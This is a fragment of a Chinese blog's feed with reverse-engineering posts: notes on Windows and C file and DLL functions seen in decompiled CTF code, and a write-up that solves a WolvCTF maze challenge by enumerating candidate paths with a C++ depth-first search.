lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD        nNumberOfBytesToRead,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD      lpNumberOfBytesRead,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">其中，各个参数的意思如下：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- `hFile`：文件句柄，表示要读取的文件。</span></span><br><span class="line"><span class="comment">- `lpBuffer`：指向要读取数据的缓冲区。</span></span><br><span class="line"><span class="comment">- `nNumberOfBytesToRead`：要读取的字节数。</span></span><br><span class="line"><span class="comment">- `lpNumberOfBytesRead`：指向保存实际读取字节数的变量。</span></span><br><span class="line"><span class="comment">- `lpOverlapped`：指向一个`OVERLAPPED`结构体，用于异步操作。如果不使用异步操作，可以设置为`NULL`。*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ReadFile</span>(hObject, &amp;Buffer, <span class="number">1u</span>, &amp;NumberOfBytesRead, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>hObject：文件句柄，指向要读取的文件。</p><p>Buffer：缓冲区，用于存储从文件中读取的数据。</p><p>1u：要读取的字节数。</p><p>NumberOfBytesRead：实际读取的字节数，由函数返回。</p><p>0：用于控制文件指针的偏移量，0表示从文件的当前位置开始读取。</p><h1 id="CloseHandle"><a href="#CloseHandle" class="headerlink" title="CloseHandle"></a>CloseHandle</h1><p>CloseHandle()函数的作用是关闭一个打开的句柄对象。它会释放句柄对象所占用的系统资源，因此在使用完句柄对象后应该调用该函数来关闭它。如果不关闭句柄对象，可能会导致资源泄漏或其他问题。该函数通常用于Windows编程中的文件、进程、线程等对象的操作。</p><h1 id="LiadLibraryW"><a href="#LiadLibraryW" class="headerlink" title="LiadLibraryW"></a>LiadLibraryW</h1><p>这个函数的作用是加载一个动态链接库(DLL)文件，并返回一个句柄(hModule)。这个句柄可以用于后续的函数调用，比如GetProcAddress()函数来获取动态链接库中的函数地址。LoadLibraryW()函数的参数是一个Unicode字符串，表示要加载的DLL文件的文件名。如果加载成功，返回的句柄非空；如果加载失败，返回NULL。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">hModule=<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;Dll2.dll&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="GetProcAddress"><a href="#GetProcAddress" class="headerlink" title="GetProcAddress"></a>GetProcAddress</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HMODULE hModule,  <span class="comment">// DLL模块句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCSTR lpProcName <span class="comment">// 函数名或函数的序号</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参数说明：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- `hModule`：DLL模块句柄，表示要获取函数地址的DLL模块。可以通过`LoadLibrary`等函数获取。</span></span><br><span class="line"><span class="comment">- `lpProcName`：函数名或函数的序号，表示要获取的函数的名称或序号。如果是函数名，需要以字符串形式传入；如果是函数序号，需要以整数形式传入。在Windows中，函数名是以ASCII字符组成的字符串，函数序号是一个整数，是函数在DLL导出表中的位置。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回值：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- 如果函数调用成功，返回值为函数的地址；</span></span><br><span class="line"><span class="comment">- 如果函数调用失败，返回值为NULL。*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v10=<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;flag&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="FreeLibrary"><a href="#FreeLibrary" class="headerlink" title="FreeLibrary"></a>FreeLibrary</h1><p>FreeLibrary函数的作用是释放一个动态链接库（DLL）的句柄，使该DLL从当前进程中卸载。在调用LoadLibrary函数加载一个DLL后，必须调用FreeLibrary函数释放该DLL的句柄，否则该DLL将一直驻留在内存中，直到进程结束。</p><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *Filename, <span class="type">const</span> <span class="type">char</span> *Mode)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参数说明：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- Filename：要打开的文件名，可以是绝对路径或相对路径。</span></span><br><span class="line"><span class="comment">- Mode：打开文件的模式，可以是以下几种：</span></span><br><span class="line"><span class="comment">  - &quot;r&quot;：只读模式，打开文件用于读取。</span></span><br><span class="line"><span class="comment">  - &quot;w&quot;：只写模式，如果文件存在则将其截断为零长度，如果文件不存在则创建该文件。</span></span><br><span class="line"><span class="comment">  - &quot;a&quot;：追加模式，打开文件用于写入，如果文件存在则在末尾追加数据，如果文件不存在则创建该文件。</span></span><br><span class="line"><span class="comment">  - &quot;rb&quot;：二进制只读模式，打开文件用于读取二进制数据。</span></span><br><span class="line"><span class="comment">  - &quot;wb&quot;：二进制只写模式，如果文件存在则将其截断为零长度，如果文件不存在则创建该文件，用于写入二进制数据。</span></span><br><span class="line"><span class="comment">  - &quot;ab&quot;：二进制追加模式，打开文件用于写入二进制数据，如果文件存在则在末尾追加数据，如果文件不存在则创建该文件。</span></span><br><span class="line"><span class="comment">    返回值：</span></span><br><span class="line"><span class="comment">- 如果成功打开文件，则返回指向该文件的指针，否则返回NULL。*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fopen</span>(Filename, <span class="string">&quot;rb&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="fgetc"><a href="#fgetc" class="headerlink" title="fgetc"></a>fgetc</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fgetc</span><span class="params">(FILE *stream)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数作用：从指定的文件流中读取一个字符，并将该字符作为无符号字符转换为int类型返回。如果到达文件结尾或发生读取错误，则返回EOF。*/</span></span><br></pre></td></tr></table></figure><p><code>fgetc(File)</code></p><h1 id="fputc"><a href="#fputc" class="headerlink" title="fputc"></a>fputc</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fputc</span><span class="params">(<span class="type">int</span> c, FILE *stream)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">其中，参数c是要写入的字符，参数stream是输出流，即要写入的文件指针。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">函数返回值为写入成功的字符，如果出现错误则返回EOF。*/</span></span><br></pre></td></tr></table></figure><p><code>fputc(*(v11 + 4 * i) ^ v8, v6)</code></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fclose</span>(File)函数的作用是关闭文件。如果文件已打开，则该函数将文件缓冲区中的任何剩余数据刷新到磁盘，并释放该文件占用的任何系统资源。关闭文件后，不能再读取或写入该文件，除非再次打开。该函数的语法如下：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fclose</span><span class="params">(FILE *File)</span></span>;</span><br><span class="line"></span><br><span class="line">其中，File是指向FILE类型结构体的指针，表示要关闭的文件。该函数返回<span class="number">0</span>表示成功，返回EOF表示失败。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> file </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迷宫问题中的dfs(进阶)</title>
      <link href="/2023/03/20/2023-03-20-%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84dfs%20(%E8%BF%9B%E9%98%B6)/"/>
      <url>/2023/03/20/2023-03-20-%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84dfs%20(%E8%BF%9B%E9%98%B6)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们在基础模板那篇文章中已经讨论了一个一般性的走迷宫使用的dfs模板，在这里我们依照WolvCTF的ej题目来讲解一下有较多限制的迷宫题目如何做。</p><h1 id="ej-题目非迷宫部分的简单介绍"><a href="#ej-题目非迷宫部分的简单介绍" class="headerlink" title="ej 题目非迷宫部分的简单介绍"></a>ej 题目非迷宫部分的简单介绍</h1><p>因为在这里我们只讨论迷宫部分的dfs，如果读者想做这道题可以找本人要。（笑）</p><p><img src="/../imgs/202303201117164.png" alt="image-20230320111731465"></p><p>这里是main函数的部分，可以看到题目的逻辑是这样的，首先输入一个字符串，这个字符串其实就是走迷宫所用的操作，然后经过一个判断，如果判断成功就输出”correct!“，然后用输入作为密钥解密密文，得到flag明文并输出，因此我们其实只需要保证第一个判断能够成功就可以了。</p><p>但是这里有一个问题就是，这个判断是走迷宫，但是这个走迷宫的方法不是唯一的，也就是说，我们需要找到所有的路径，然后挨着判断输出是否是真正的flag。</p><p>这个判断函数里面是一个走迷宫，这里将迷宫图案贴出来。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0 0 0 0 0</span><br><span class="line">0 0 1 1 0 0</span><br><span class="line">0 0 1 0 0 0</span><br><span class="line">0 0 1 0 0 1</span><br><span class="line">0 0 0 1 2 0</span><br><span class="line">2 0 0 0 0 2</span><br></pre></td></tr></table></figure><p>这里有三种情况，分别是0 ,1,2。</p><p>要求是这样的，0是可以走的，并且没有限制，起点是（0,0），终点也是（0,0）。</p><p>1是可以选择走或者不走，但是如果要走的话有限制，就是从1之前的位置来到1时选择的方向，从1之紧接着还要再走一次。举个例子，从坐标（2,1）走到（2,2）这个是1 的位置，是向右走，那么从（2,2）还要再向右走一次走到（2,3），其他方向不可以走。</p><p>2是必须要走的，走2的时候也有限制，从2之前来的最近的两次操作必须是一样的，在2这个位置必须拐弯，拐弯之后紧接着的两次操作也必须是一样的。比如如果从（2,4）这个位置要走到（4,4）这个位置，必须是往下走两个，然后拐弯，向左再走两个位置（这个和（4,3）坐标的1的限制并不冲突）</p><p>知道了迷宫的走法后，我们就可以来写dfs走迷宫了。</p><h1 id="代码及其解析"><a href="#代码及其解析" class="headerlink" title="代码及其解析"></a>代码及其解析</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> map[<span class="number">6</span>][<span class="number">6</span>]=&#123;</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> dx[]=&#123;<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;<span class="comment">//x的变化量</span></span><br><span class="line"><span class="type">int</span> dy[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;<span class="comment">//y的变化量</span></span><br><span class="line"><span class="type">bool</span> r[<span class="number">6</span>][<span class="number">6</span>];<span class="comment">//记录是否走过这个位置</span></span><br><span class="line"><span class="type">int</span> v2=<span class="number">3</span>;<span class="comment">//记录还有多少个2的点需要走</span></span><br><span class="line"><span class="type">char</span> path[<span class="number">50</span>];<span class="comment">//记录路径</span></span><br><span class="line"><span class="type">int</span> length=<span class="number">0</span>;<span class="comment">//记录路径长度</span></span><br><span class="line"><span class="type">char</span> op[]=&#123;<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;r&#x27;</span>&#125;;<span class="comment">//表示操作 </span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;<span class="comment">//检查点的合法性</span></span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">0</span>&amp;&amp;y==<span class="number">0</span>&amp;&amp;v2==<span class="number">0</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(x&gt;=<span class="number">0</span>&amp;&amp;x&lt;=<span class="number">5</span>&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;y&lt;=<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(r[x][y]==<span class="number">0</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans=<span class="number">0</span>;<span class="comment">//记录有多少条路径是成功的</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> move)</span></span>&#123;<span class="comment">//move  -&gt;   0-&gt;u  1-&gt;d  2-&gt;l  3-&gt;r</span></span><br><span class="line">    <span class="comment">//move这个参数记录走到(x,y)这个点的操作是什么</span></span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">0</span>&amp;&amp;y==<span class="number">0</span>&amp;&amp;v2==<span class="number">0</span>)&#123;  <span class="comment">//首先判断是否成功，v2记录还有多少2没有走</span></span><br><span class="line">ans++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">cout&lt;&lt;path[i];</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(map[x][y]==<span class="number">2</span>)&#123;<span class="comment">//判断是不是2 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;<span class="comment">//我们要往4个方向都要走，这里其实有一个问题，</span></span><br><span class="line">            <span class="comment">//就是我没有判断拐弯，因为这个迷宫是固定的</span></span><br><span class="line">            <span class="comment">//所以拐弯不需要判定，一定会拐弯</span></span><br><span class="line"><span class="type">int</span> qx=x+dx[i]+dx[i];<span class="comment">//对x进行两次变化，要走两步一样的</span></span><br><span class="line"><span class="type">int</span> qy=y+dy[i]+dy[i];<span class="comment">//对y也进行同样的操作</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">check</span>(qx,qy)&amp;&amp;<span class="built_in">check</span>(qx-dx[i],qy-dy[i])&amp;&amp;(path[length<span class="number">-1</span>]==path[length<span class="number">-2</span>]))&#123; <span class="comment">//前两个是分别判断要走的两个点是否合法</span></span><br><span class="line">                <span class="comment">//第三个是判断2之前的两次操作必须一样</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;qx&lt;&lt;&quot; &quot;&lt;&lt;qy&lt;&lt;endl;</span></span><br><span class="line">path[length]=op[i]; <span class="comment">//这要走两步，因此要写两遍</span></span><br><span class="line">length++;</span><br><span class="line">path[length]=op[i];</span><br><span class="line">length++;</span><br><span class="line">r[qx][qy]=<span class="number">1</span>;       <span class="comment">//标记是否走过</span></span><br><span class="line">r[qx-dx[i]][qy-dy[i]]=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">dfs</span>(qx,qy,i);</span><br><span class="line">r[qx-dx[i]][qy-dy[i]]=<span class="number">0</span>;<span class="comment">//回溯</span></span><br><span class="line">r[qx][qy]=<span class="number">0</span>;</span><br><span class="line">length--;</span><br><span class="line">path[length]=<span class="number">0</span>;</span><br><span class="line">length--;</span><br><span class="line">path[length]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//别忘了返回！</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(map[x][y]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> qx=x+dx[move];<span class="comment">//要和上一次操作一样，move这个参数就是为了这里准备的</span></span><br><span class="line"><span class="type">int</span> qy= y+dy[move];</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">check</span>(qx,qy))&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;qx&lt;&lt;&quot; &quot;&lt;&lt;qy&lt;&lt;endl;</span></span><br><span class="line"><span class="keyword">if</span>(map[qx][qy]==<span class="number">2</span>)v2--;  <span class="comment">//这里是一个关键的地方，如果即将要走的点是2</span></span><br><span class="line">            <span class="comment">//就要让v2自减</span></span><br><span class="line">path[length]=op[move];</span><br><span class="line">length++;</span><br><span class="line">r[qx][qy]=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">dfs</span>(qx,qy,move);</span><br><span class="line">r[qx][qy]=<span class="number">0</span>;<span class="comment">//回溯！</span></span><br><span class="line">length--;</span><br><span class="line">path[length]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(map[qx][qy]==<span class="number">2</span>)v2++;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//别忘了返回！</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;<span class="comment">//如果是0的话就走这个循环</span></span><br><span class="line"><span class="type">int</span> qx=x+dx[i];</span><br><span class="line"><span class="type">int</span> qy=y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">check</span>(qx,qy))&#123;</span><br><span class="line"><span class="keyword">if</span>(map[qx][qy]==<span class="number">2</span>)v2--;</span><br><span class="line">path[length]=op[i];</span><br><span class="line">length++;</span><br><span class="line">r[qx][qy]=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//cout&lt;&lt;x&lt;&lt;&quot; &quot;&lt;&lt;y&lt;&lt;&quot;key&quot;&lt;&lt;qx&lt;&lt;&quot; &quot;&lt;&lt;qy&lt;&lt;endl;</span></span><br><span class="line"><span class="built_in">dfs</span>(qx,qy,i);</span><br><span class="line">r[qx][qy]=<span class="number">0</span>;    <span class="comment">//回溯</span></span><br><span class="line">length--;</span><br><span class="line">path[length]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(map[qx][qy]==<span class="number">2</span>)v2++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">5</span>;j++)&#123;</span><br><span class="line">cout&lt;&lt;map[i][j];</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">r[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;<span class="comment">//首先把（0,0）这个位置标记为走过，防止回走</span></span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//调用dfs，第三个参数可以随便写</span></span><br><span class="line">cout&lt;&lt;ans;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里的dfs里面我们在要先将特殊的位置进行判断，之后再判断不特殊的位置</p><p>可以看到这里的代码套用的完全是上一篇文章的模板，即使是有1和2的限制，也逃脱不开模板</p><h1 id="102个输出！"><a href="#102个输出！" class="headerlink" title="102个输出！"></a>102个输出！</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dddddrrrrruuuuulddddlluuuull 1</span><br><span class="line">dddddrrrrruuuuulddddllluuuul 2</span><br><span class="line">dddddrrrrruuuuulddddllluurruulll 3</span><br><span class="line">dddddrrrrruuuuulddddlllurruuulll 4</span><br><span class="line">dddddrrrrruuuuulddddlllurrulluul 5</span><br><span class="line">dddddrrrrruuuuullddrddlluuuull 6</span><br><span class="line">dddddrrrrruuuuullddrddllluuuul 7</span><br><span class="line">dddddrrrrruuuululddrddlluuuull 8</span><br><span class="line">dddddrrrrruuuululddrddllluuuul 9</span><br><span class="line">dddddrrrrruuuuldddlluuuull 10</span><br><span class="line">dddddrrrrruuuuldddllluuuul 11</span><br><span class="line">dddddrrrrruuuuldddllluurruulll 12</span><br><span class="line">dddddrrrrruuuuldddlllurruuulll 13</span><br><span class="line">dddddrrrrruuuuldddlllurrulluul 14</span><br><span class="line">dddddrrrrruuulddlluuuull 15</span><br><span class="line">dddddrrrrruuulddllluuuul 16</span><br><span class="line">dddddrrrrruuulddllluuurrrullll 17</span><br><span class="line">dddddrrrrruuulddllluuurrrrulllll 18</span><br><span class="line">dddddrrrrruuulddllluurruulll 19</span><br><span class="line">dddddrrrrruuulddlllurruuulll 20</span><br><span class="line">dddddrrrrruuulddlllurrulluul 21</span><br><span class="line">dddddrrrrruuulddlllurrullurrrullll 22</span><br><span class="line">dddddrrrrruuulddlllurrullurrrrulllll 23</span><br><span class="line">ddrurrrdddlllulddrrrrruuuuulllll 24</span><br><span class="line">ddrdlddrrrrruuuuulddddlluuuull 25</span><br><span class="line">ddrdlddrrrrruuuuullddrddlluuuull 26</span><br><span class="line">ddrdlddrrrrruuuululddrddlluuuull 27</span><br><span class="line">ddrdlddrrrrruuuuldddlluuuull 28</span><br><span class="line">ddrdlddrrrrruuulddlluuuull 29</span><br><span class="line">ddrrrrddlllulddrrrrruuuuuldlllul 30</span><br><span class="line">ddrrrrddlllulddrrrrruuuuulllll 31</span><br><span class="line">ddrrrrddlllulddrrrrruuuulullll 32</span><br><span class="line">ddrrrrddlllulddrrrrruuuullllul 33</span><br><span class="line">drddlddrrrrruuuuulddddlluuuull 34</span><br><span class="line">drddlddrrrrruuuuullddrddlluuuull 35</span><br><span class="line">drddlddrrrrruuuululddrddlluuuull 36</span><br><span class="line">drddlddrrrrruuuuldddlluuuull 37</span><br><span class="line">drddlddrrrrruuulddlluuuull 38</span><br><span class="line">drdldddrrrrruuuuulddddlluuuull 39</span><br><span class="line">drdldddrrrrruuuuulddddlllurruuulll 40</span><br><span class="line">drdldddrrrrruuuuullddrddlluuuull 41</span><br><span class="line">drdldddrrrrruuuululddrddlluuuull 42</span><br><span class="line">drdldddrrrrruuuuldddlluuuull 43</span><br><span class="line">drdldddrrrrruuuuldddlllurruuulll 44</span><br><span class="line">drdldddrrrrruuulddlluuuull 45</span><br><span class="line">drdldddrrrrruuulddlllurruuulll 46</span><br><span class="line">drdrrrddlllulddrrrrruuuuulllll 47</span><br><span class="line">drdrrrddlllulddrrrrruuuulullll 48</span><br><span class="line">drrrrdddllluuldddrrrrruuuuulllll 49</span><br><span class="line">drrrrdddlllulddrrrrruuuuulllll 50</span><br><span class="line">drrrrdddlllurrullldddrrrrruuuuulllll 51</span><br><span class="line">rddddrrruuuurdddddllllluuuuu 52</span><br><span class="line">rddddrrruuurddddllllluuuuu 53</span><br><span class="line">rddddrrruuluurdrddddllllluuuuu 54</span><br><span class="line">rddddrrruuluurrdddddllllluuuuu 55</span><br><span class="line">rddddrrruurdddllllluuuuu 56</span><br><span class="line">rddrrdlldrrruuuurdddddllllluuuuu 57</span><br><span class="line">rddrrdlldrrruuurddddllllluuuuu 58</span><br><span class="line">rddrrdlldrrruurdddllllluuuuu 59</span><br><span class="line">rdrrrurdddddllllluurdrrruulllluu 60</span><br><span class="line">rdrrrrddddllllluurdrrruulllluu 61</span><br><span class="line">rrddddrruuuurdddddllllluuuuu 62</span><br><span class="line">rrddddrruuuurdddddllllluuurulu 63</span><br><span class="line">rrddddrruuuurdddddllllluuruulu 64</span><br><span class="line">rrddddrruuuurdddddllllluuruluu 65</span><br><span class="line">rrddddrruuurddddllllluuuuu 66</span><br><span class="line">rrddddrruuurddddllllluuurulu 67</span><br><span class="line">rrddddrruuurddddllllluuruulu 68</span><br><span class="line">rrddddrruuurddddllllluuruluu 69</span><br><span class="line">rrddddrruuluurdrddddllllluuuuu 70</span><br><span class="line">rrddddrruuluurdrddddllllluuurulu 71</span><br><span class="line">rrddddrruuluurdrddddllllluuruulu 72</span><br><span class="line">rrddddrruuluurdrddddllllluuruluu 73</span><br><span class="line">rrddddrruuluurrdddddllllluuuuu 74</span><br><span class="line">rrddddrruuluurrdddddllllluuurulu 75</span><br><span class="line">rrddddrruuluurrdddddllllluuruulu 76</span><br><span class="line">rrddddrruuluurrdddddllllluuruluu 77</span><br><span class="line">rrddddrruurdddllllluuuuu 78</span><br><span class="line">rrddddrruurdddllllluuurulu 79</span><br><span class="line">rrddddrruurdddllllluuruulu 80</span><br><span class="line">rrddddrruurdddllllluuruluu 81</span><br><span class="line">rrrdddlldrrruuuurdddddllllluuuuu 82</span><br><span class="line">rrrdddlldrrruuuurdddddllllluuurulu 83</span><br><span class="line">rrrdddlldrrruuurddddllllluuuuu 84</span><br><span class="line">rrrdddlldrrruuurddddllllluuurulu 85</span><br><span class="line">rrrdddlldrrruurdddllllluuuuu 86</span><br><span class="line">rrrdddlldrrruurdddllllluuurulu 87</span><br><span class="line">rrrddllddrrruuuurdddddllllluuuuu 88</span><br><span class="line">rrrddllddrrruuurddddllllluuuuu 89</span><br><span class="line">rrrddllddrrruurdddllllluuuuu 90</span><br><span class="line">rrrrdllldddrrruurdddllllluuuuu 91</span><br><span class="line">rrrrdllldrrdlldrrruurdddllllluuuuu 92</span><br><span class="line">rrrrdrddddllllluurdrrruulllulu 93</span><br><span class="line">rrrrdrddddllllluurdrrruulllluu 94</span><br><span class="line">rrrrrdddddllllluuurddrrruuullllu 95</span><br><span class="line">rrrrrdddddllllluuurrrdlldrrruuullllu 96</span><br><span class="line">rrrrrdddddllllluurdrrruuullldluu 97</span><br><span class="line">rrrrrdddddllllluurdrrruuullllu 98</span><br><span class="line">rrrrrdddddllllluurdrrruulllulu 99</span><br><span class="line">rrrrrdddddllllluurdrrruulllluu 100</span><br><span class="line">rrrrrdlllldddrrruurdddllllluuuuu 101</span><br><span class="line">rrrrrdlllldrrdlldrrruurdddllllluuuuu 102</span><br></pre></td></tr></table></figure><p>笔者挨着从第一个开始测试，终于到第92个的时候测试成功了，flag出现了</p><p>www,运气真差,www</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dfs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr初体验</title>
      <link href="/2023/03/19/2023-03-19-angr%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>/2023/03/19/2023-03-19-angr%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
